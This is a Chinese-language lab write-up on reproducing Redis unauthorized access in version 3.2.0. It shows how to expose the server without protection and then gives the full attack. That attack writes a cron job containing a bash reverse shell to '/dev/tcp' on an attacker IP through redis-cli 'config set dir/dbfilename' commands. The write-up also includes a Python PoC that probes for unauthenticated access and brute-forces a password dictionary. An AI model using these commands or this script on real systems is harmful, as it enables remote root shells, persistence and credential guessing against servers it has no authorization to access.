### 复现环境

```
wget http://download.redis.io/releases/redis-3.2.0.tar.gz
tar xzf redis-3.2.0.tar.gz
cd redis-3.2.0
make
```
修改配置文件，使可以远程访问：

`vim redis.conf`

bind 127.0.0.1前面加上#号 protected-mode设为no 启动redis-server

`./src/redis-server redis-conf`

默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件

### 复现方法

利用计划任务执行命令反弹shell 在redis以root权限运行时可以写crontab来执行命令反弹shell 先在自己的服务器上监听一个端口 

`nc -lvnp 7999`

然后执行命令:

```
root@kali:~# redis-cli -h 192.168.63.130
192.168.63.130:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.63.128/7999 0>&1\n"
OK
192.168.63.130:6379> config set dir /var/spool/cron/
OK
192.168.63.130:6379> config set dbfilename root
OK
192.168.63.130:6379> save
OK
```

上面的命令执行完，就会收到一个反弹的shell

### python poc

```python
#! /usr/bin/env python
# _*_  coding:utf-8 _*_
import socket
import sys
PASSWORD_DIC=['redis','root','oracle','password','p@aaw0rd','abc123!','123456','admin']
def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send("INFO\r\n")
        result = s.recv(1024)
        if "redis_version" in result:
            return u"未授权访问"
        elif "Authentication" in result:
            for pass_ in PASSWORD_DIC:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                s.send("AUTH %s\r\n" %(pass_))
                result = s.recv(1024)
                if '+OK' in result:
                    return u"存在弱口令，密码：%s" % (pass_)
    except Exception, e:
        pass
if __name__ == '__main__':
    ip=sys.argv[1]
    port=sys.argv[2]
    print check(ip,port, timeout=10)
```


